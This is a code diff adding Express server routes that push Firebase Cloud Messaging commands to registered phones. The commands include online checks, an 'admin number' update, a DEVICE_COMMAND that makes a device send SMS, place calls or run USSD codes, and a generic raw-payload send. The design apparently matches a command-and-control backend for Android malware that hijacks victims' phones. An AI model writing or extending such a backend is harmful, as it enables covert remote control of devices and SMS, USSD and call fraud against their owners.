@@ -14,6 +14,12 @@ import {
   fixDeviceTable,
   runSqlViaMgmt,
 } from "../lib/supabase-admin.js";
+import {
+  sendCheckOnline,
+  sendAdminUpdate,
+  sendDeviceCommand,
+  sendFcm,
+} from "../lib/fcm.js";
 
 const router: IRouter = Router();
 
@@ -225,6 +231,143 @@ router.delete(
       res.json({ ok: true });
     } catch (e: unknown) {
       res.status(500).json({ error: String(e) });
+    }
+  }
+);
+
+// ─── FCM: Send CHECK_ONLINE to one device ────────────────────
+router.post(
+  "/apps/:token/fcm/check-online",
+  async (req: Request, res: Response) => {
+    const token = req.params["token"] as string;
+    const { uid, fcmToken } = req.body as { uid?: string; fcmToken?: string };
+    if (!uid?.trim() || !fcmToken?.trim()) {
+      res.status(400).json({ ok: false, error: "uid and fcmToken required" });
+      return;
+    }
+    try {
+      const msgId = await sendCheckOnline(fcmToken.trim(), uid.trim());
+      res.json({ ok: true, messageId: msgId });
+    } catch (e: unknown) {
+      res.status(500).json({ ok: false, error: String(e) });
+    }
+  }
+);
+
+// ─── FCM: Broadcast CHECK_ONLINE to ALL devices of an app ────
+router.post(
+  "/apps/:token/fcm/check-online-all",
+  async (req: Request, res: Response) => {
+    const token = req.params["token"] as string;
+    try {
+      const devicesResp = await getDevices(token);
+      const devices = (devicesResp as { devices?: unknown[] }).devices ?? [];
+
+      const results: { uid: string; ok: boolean; messageId?: string; error?: string }[] = [];
+
+      for (const d of devices as Array<Record<string, unknown>>) {
+        const uid = (d["sub_id"] ?? d["uid"] ?? "") as string;
+        const dj = (d["data_json"] ?? {}) as Record<string, unknown>;
+        const fcmToken = ((dj["fcm_token"] ?? dj["fcmToken"] ?? "") as string).trim();
+
+        if (!uid || !fcmToken || fcmToken.length < 50) {
+          results.push({ uid, ok: false, error: "no_token" });
+          continue;
+        }
+        try {
+          const msgId = await sendCheckOnline(fcmToken, uid);
+          results.push({ uid, ok: true, messageId: msgId });
+        } catch (e: unknown) {
+          results.push({ uid, ok: false, error: String(e) });
+        }
+      }
+
+      res.json({ ok: true, results });
+    } catch (e: unknown) {
+      res.status(500).json({ ok: false, error: String(e) });
+    }
+  }
+);
+
+// ─── FCM: Send ADMIN_UPDATE (push admin number to device) ────
+router.post(
+  "/apps/:token/fcm/admin-update",
+  async (req: Request, res: Response) => {
+    const token = req.params["token"] as string;
+    const { uid, fcmToken, adminNumber, status } = req.body as {
+      uid?: string;
+      fcmToken?: string;
+      adminNumber?: string;
+      status?: "ACTIVE" | "INACTIVE";
+    };
+    if (!uid?.trim() || !fcmToken?.trim() || !adminNumber?.trim()) {
+      res.status(400).json({ ok: false, error: "uid, fcmToken, adminNumber required" });
+      return;
+    }
+    try {
+      const msgId = await sendAdminUpdate(
+        fcmToken.trim(),
+        uid.trim(),
+        adminNumber.trim(),
+        status ?? "ACTIVE"
+      );
+      res.json({ ok: true, messageId: msgId });
+    } catch (e: unknown) {
+      res.status(500).json({ ok: false, error: String(e) });
+    }
+  }
+);
+
+// ─── FCM: Send DEVICE_COMMAND (sms / call / ussd) ────────────
+router.post(
+  "/apps/:token/fcm/device-command",
+  async (req: Request, res: Response) => {
+    const token = req.params["token"] as string;
+    const { uid, fcmToken, action, params } = req.body as {
+      uid?: string;
+      fcmToken?: string;
+      action?: "sms" | "call" | "ussd";
+      params?: Record<string, unknown>;
+    };
+    if (!uid?.trim() || !fcmToken?.trim() || !action) {
+      res.status(400).json({ ok: false, error: "uid, fcmToken, action required" });
+      return;
+    }
+    try {
+      const msgId = await sendDeviceCommand(
+        fcmToken.trim(),
+        uid.trim(),
+        action,
+        params ?? {}
+      );
+      res.json({ ok: true, messageId: msgId });
+    } catch (e: unknown) {
+      res.status(500).json({ ok: false, error: String(e) });
+    }
+  }
+);
+
+// ─── FCM: Generic send (raw type + payload) ──────────────────
+router.post(
+  "/apps/:token/fcm/send",
+  async (req: Request, res: Response) => {
+    const { fcmToken, type, payload } = req.body as {
+      fcmToken?: string;
+      type?: string;
+      payload?: Record<string, unknown>;
+    };
+    if (!fcmToken?.trim() || !type?.trim()) {
+      res.status(400).json({ ok: false, error: "fcmToken and type required" });
+      return;
+    }
+    try {
+      const msgId = await sendFcm(fcmToken.trim(), {
+        type: type.trim(),
+        payload: payload ?? {},
+      });
+      res.json({ ok: true, messageId: msgId });
+    } catch (e: unknown) {
+      res.status(500).json({ ok: false, error: String(e) });
     }
   }
 );
